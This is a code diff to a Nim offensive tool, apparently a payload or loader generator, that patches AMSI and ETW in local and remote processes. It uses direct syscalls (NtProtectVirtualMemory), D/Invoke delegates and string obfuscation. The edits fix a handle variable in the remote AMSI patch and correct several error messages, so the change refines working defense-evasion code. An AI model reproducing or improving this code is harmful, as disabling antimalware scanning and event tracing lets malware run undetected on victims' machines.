@@ -1,5 +1,4 @@
 import strformat
-import strutils
 
 let DInvokeGetModuleHandleADelegate* = """
 
@@ -446,7 +445,7 @@ when isMainModule:
     if (success == 0):
         success = remoteLoadAmsi(remoteProcID)
         HowMuchTimeWouldYoulikeToSleep(2)
-        success = RemotePatchAmsi(hProcetw)
+        success = RemotePatchAmsi(hProcams)
     echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
 
 """
@@ -729,7 +728,7 @@ proc PatchAmsi(): bool =
         status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            echo obf("[-] Failed to change memory protections.")
         else:
             echo obf("[*] Applying Syscall AMSI patch")
     else:
@@ -760,7 +759,7 @@ proc PatchAmsi(): bool =
         status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            echo obf("[-] Failed to change memory protections.")
         else:
             echo obf("[+] OldProtect set back")
             disabled = true
@@ -820,7 +819,7 @@ proc Patchntdll(): bool =
         status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            echo obf("[-] Failed to change memory protections.")
         else:
             echo obf("[*] Applying Syscall ETW patch")
     else:
@@ -850,7 +849,7 @@ proc Patchntdll(): bool =
         status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            echo obf("[-] Failed to change memory protections.")
         else:
             echo obf("[+] OldProtect set back")
             disabled = true
